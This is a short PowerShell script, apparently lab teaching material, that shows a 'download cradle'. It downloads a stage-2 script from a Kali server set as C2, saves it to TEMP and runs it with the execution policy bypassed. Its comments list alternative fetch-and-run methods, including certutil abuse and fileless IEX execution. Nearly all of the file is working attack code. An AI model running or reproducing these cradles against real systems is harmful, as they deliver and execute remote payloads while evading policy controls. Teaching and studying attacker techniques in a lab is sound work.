# PowerShell Download Cradle — Lab Demo
# Downloads and runs calc_payload.ps1 from the Kali HTTP server.
# Shows the most common attacker technique for stage-2 payload delivery.
#
# Set C2 to your Kali IP before running
$C2   = if ($env:KALI_IP)   { $env:KALI_IP }   else { "KALI_IP_NOT_SET" }
$Port = if ($env:KALI_PORT) { $env:KALI_PORT } else { "8080" }

$url = "http://${C2}:${Port}/payloads/calc_payload.ps1"
$out = "$env:TEMP\stage2.ps1"

Write-Host "`n[CRADLE] Downloading: $url" -ForegroundColor Yellow

# --- Method shown in lesson (WebClient) ---
(New-Object System.Net.WebClient).DownloadFile($url, $out)
Write-Host "[CRADLE] Saved to $out" -ForegroundColor Green
Write-Host "[CRADLE] Executing..."   -ForegroundColor Yellow

powershell -ExecutionPolicy Bypass -File $out

# --- Other methods students should know (shown, not run) ---
# Invoke-WebRequest  : IWR -Uri $url -OutFile $out -UseBasicParsing
# BITS transfer      : Start-BitsTransfer -Source $url -Destination $out
# certutil (LOLBin)  : certutil -urlcache -split -f $url $out
# Fileless (no disk) : IEX(IWR -Uri $url -UseBasicParsing).Content
